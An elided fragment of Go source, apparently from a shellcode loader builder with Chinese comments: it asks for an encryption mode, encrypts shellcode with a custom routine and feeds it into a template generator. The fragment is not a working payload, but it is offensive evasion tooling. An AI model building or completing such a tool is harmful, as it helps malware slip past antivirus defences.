...
func main() {
	...
	if xid == 1 {
		...
		fmt.Scanln(&enmode)
		if enmode == "AES" {
			fmt.Println("[+]加密方式 [默认AES，其他也没撒必要]")
			fmt.Println("开始制作------------------------->")
			Aes_go(sc, tplname)
...
func Aes_go(sc []byte, tmpmode string) {

	// 加密
	shellsrc := wins.Bagua_en(sc)

	//执行模板操作，参数1 加密内容 参数2 密钥 参数3 加密类型 参数4 模板
	In.Tpl_go(shellsrc, tmpmode)
